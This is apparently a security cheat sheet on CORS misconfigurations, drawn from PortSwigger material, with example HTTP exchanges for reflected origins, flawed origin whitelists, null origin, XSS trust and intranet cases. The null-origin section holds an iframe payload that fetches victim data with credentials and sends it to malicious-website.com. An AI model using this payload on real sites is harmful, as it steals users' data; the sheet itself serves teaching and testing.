## Things You Need to Know

- [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
- [Same-origin policy (SOP)](https://portswigger.net/web-security/cors/same-origin-policy)
- [CORS and the Access-Control-Allow-Origin response header](https://portswigger.net/web-security/cors/access-control-allow-origin)

## Tools

- [CORScanner](https://github.com/chenjj/CORScanner)


## Details Vulnerabilities

### Server-generated ACAO header from client-specified Origin header

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

### Errors parsing Origin headers

For example, the application receives a normal request like:
```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
``` 

The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:

```http
normal-website.com
```
An attacker might be able to gain access by registering the domain:

```http
hackersnormal-website.com
```

Alternatively, suppose an application grants access to all domains beginning with

```http
normal-website.com
```

An attacker might be able to gain access using the domain:

```http
normal-website.com.evil-user.net
```

## Whitelisted null origin value

Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-domain request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

And the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-domain request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

Given the following request:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:

```http
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The application responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

## Intranets and CORS without credentials

Most CORS attacks rely on the presence of the response header:

```http
Access-Control-Allow-Credentials: true
```

For example, a cross-domain request within a private network may be as follows:

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

And the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

